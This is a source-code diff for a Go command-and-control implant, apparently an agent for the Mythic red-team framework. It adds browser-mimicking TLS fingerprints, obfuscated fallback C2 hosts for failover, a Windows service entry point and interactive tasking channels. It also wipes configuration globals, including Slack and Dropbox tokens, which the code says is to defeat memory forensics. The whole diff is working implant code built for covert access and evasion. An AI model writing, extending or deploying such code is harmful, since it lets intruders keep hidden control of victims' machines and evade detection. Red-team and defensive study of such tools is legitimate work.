@@ -50,6 +50,8 @@ var (
 	hostHeader           string = ""     // Override Host header for domain fronting
 	proxyURL             string = ""     // HTTP/SOCKS proxy URL (e.g., http://proxy:8080)
 	tlsVerify            string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
+	tlsFingerprint       string = ""     // TLS ClientHello fingerprint: chrome, firefox, safari, edge, random, go (default)
+	fallbackHosts        string = ""     // Comma-separated fallback C2 URLs for automatic failover
 	workingHoursStart    string = ""     // Working hours start (HH:MM, 24hr local time)
 	workingHoursEnd      string = ""     // Working hours end (HH:MM, 24hr local time)
 	workingDays          string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
@@ -79,6 +81,9 @@ var (
 )
 
 func main() {
+	if tryRunAsService() {
+		return
+	}
 	runAgent()
 }
 
@@ -97,6 +102,7 @@ func runAgent() {
 			hostHeader = xorDecodeString(hostHeader, keyBytes)
 			proxyURL = xorDecodeString(proxyURL, keyBytes)
 			customHeaders = xorDecodeString(customHeaders, keyBytes)
+			fallbackHosts = xorDecodeString(fallbackHosts, keyBytes)
 			// Zero the XOR key — no longer needed after deobfuscation
 			zeroBytes(keyBytes)
 		}
@@ -264,6 +270,21 @@ func runAgent() {
 			callbackURL = fmt.Sprintf("http://%s:%d", callbackHost, callbackPortInt)
 		}
 
+		var fallbackURLs []string
+		if fallbackHosts != "" {
+			for _, fb := range strings.Split(fallbackHosts, ",") {
+				fb = strings.TrimSpace(fb)
+				if fb == "" {
+					continue
+				}
+				if strings.HasPrefix(fb, "http://") || strings.HasPrefix(fb, "https://") {
+					fallbackURLs = append(fallbackURLs, fmt.Sprintf("%s:%d", fb, callbackPortInt))
+				} else {
+					fallbackURLs = append(fallbackURLs, fmt.Sprintf("http://%s:%d", fb, callbackPortInt))
+				}
+			}
+		}
+
 		httpProfile := http.NewHTTPProfile(
 			callbackURL,
 			userAgent,
@@ -277,6 +298,8 @@ func runAgent() {
 			hostHeader,
 			proxyURL,
 			tlsVerify,
+			tlsFingerprint,
+			fallbackURLs,
 		)
 		// Decode and apply custom HTTP headers from C2 profile
 		if customHeaders != "" {
@@ -288,6 +311,10 @@ func runAgent() {
 			}
 		}
 		c2 = profiles.NewProfile(httpProfile)
+
+		if err := httpProfile.SealConfig(); err != nil {
+			log.Printf("seal failed: %v", err)
+		}
 
 		// Also create a TCP profile instance for P2P child management.
 		// Even HTTP egress agents can link to TCP children.
@@ -311,12 +338,16 @@ func runAgent() {
 		commands.SetRpfwdManager(rpfwdManager)
 		httpProfile.GetRpfwdOutbound = rpfwdManager.DrainOutbound
 		httpProfile.HandleRpfwd = rpfwdManager.HandleMessages
+		httpProfile.GetInteractiveOutbound = commands.DrainInteractiveOutput
+		httpProfile.HandleInteractive = commands.RouteInteractiveInput
 	}
 
 	// Configure child process protections (Windows: block non-Microsoft DLLs)
 	if blockDLLs == "true" {
 		commands.SetBlockDLLs(true)
 	}
+
+	commands.DefaultUserAgent = userAgent
 
 	// Clear build-time globals — all values have been copied into agent/profile structs.
 	// Prevents memory forensics from extracting sensitive config from the data segment.
@@ -497,11 +528,13 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 
 	// Create Job struct with channels for this task
 	job := &structs.Job{
-		Stop:              new(int),
-		SendResponses:     make(chan structs.Response, 100),
-		SendFileToMythic:  files.SendToMythicChannel,
-		GetFileFromMythic: files.GetFromMythicChannel,
-		FileTransfers:     make(map[string]chan json.RawMessage),
+		Stop:                         new(int),
+		SendResponses:                make(chan structs.Response, 100),
+		SendFileToMythic:             files.SendToMythicChannel,
+		GetFileFromMythic:            files.GetFromMythicChannel,
+		FileTransfers:                make(map[string]chan json.RawMessage),
+		InteractiveTaskInputChannel:  make(chan structs.InteractiveMsg, 100),
+		InteractiveTaskOutputChannel: make(chan structs.InteractiveMsg, 100),
 	}
 	task.Job = job
 
@@ -795,4 +828,36 @@ func clearGlobals() {
 	proxyURL = ""
 	customHeaders = ""
 	xorKey = ""
+	tlsVerify = ""
+	tlsFingerprint = ""
+	fallbackHosts = ""
+	tcpBindAddress = ""
+	transportType = ""
+	slackBotToken = ""
+	slackChannelID = ""
+	slackPollInterval = ""
+	dropboxToken = ""
+	dropboxTaskFolder = ""
+	dropboxResultFolder = ""
+	dropboxArchiveFolder = ""
+	dropboxPollInterval = ""
+	sleepInterval = ""
+	jitter = ""
+	killDate = ""
+	maxRetries = ""
+	debug = ""
+	workingHoursStart = ""
+	workingHoursEnd = ""
+	workingDays = ""
+	envKeyHostname = ""
+	envKeyDomain = ""
+	envKeyUsername = ""
+	envKeyProcess = ""
+	selfDelete = ""
+	masqueradeName = ""
+	autoPatch = ""
+	blockDLLs = ""
+	indirectSyscalls = ""
+	sandboxGuard = ""
+	sleepMask = ""
 }
